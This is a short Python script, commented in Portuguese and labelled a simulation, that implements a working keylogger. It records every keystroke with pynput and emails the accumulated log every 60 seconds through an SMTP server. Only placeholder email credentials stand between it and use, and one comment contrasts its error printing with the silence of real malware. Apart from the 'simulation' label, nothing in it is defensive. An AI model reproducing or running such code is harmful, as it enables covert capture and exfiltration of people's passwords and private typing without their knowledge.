from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# --- CONFIGURAÇÕES DE AMBIENTE (PLACEHOLDERS) ---
# Em um cenário real, estas credenciais devem ser protegidas
EMAIL_ORIGEM = "seu-email-fake@provedor.com"
EMAIL_DESTINO = "seu-email-destino@provedor.com"
SENHA_EMAIL = "sua-senha-de-aplicativo" 
SERVIDOR_SMTP = "smtp.provedor.com" # Ex: smtp.gmail.com
PORTA_SMTP = 587

log = ""

def enviar_email():
    global log
    if log:
        # Criando a estrutura da mensagem
        msg = MIMEText(log)
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        msg['Subject'] = "Relatório de Atividade - Simulação Keylogger"

        try:
            # Conexão com o servidor SMTP
            server = smtplib.SMTP(SERVIDOR_SMTP, PORTA_SMTP)
            server.starttls() # Protocolo de segurança
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
            # Limpa o log após o envio bem-sucedido
            log = "" 
        except Exception as e:
            # Em simulações, imprimimos o erro. Em malwares reais, seria silencioso.
            print(f"Falha na exfiltração: {e}")

    # Agenda o próximo envio para daqui a 60 segundos (Recursividade com Timer)
    timer = Timer(60, enviar_email)
    timer.daemon = True # Garante que o timer feche se o programa principal fechar
    timer.start()

def on_press(key):
    global log
    try:
        # Captura caracteres alfanuméricos
        log += key.char
    except AttributeError:
        # Trata teclas especiais para manter o log legível
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.backspace:
            log += "[<]"
        else:
            pass # Ignora teclas de sistema (Shift, Ctrl, etc)

# --- INÍCIO DA EXECUÇÃO ---
if __name__ == "__main__":
    print("[*] Keylogger com exfiltração iniciado. Pressione Ctrl+C para encerrar.")
    
    # Inicia o ciclo de envio automático
    enviar_email()
    
    # Inicia o monitoramento do teclado
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
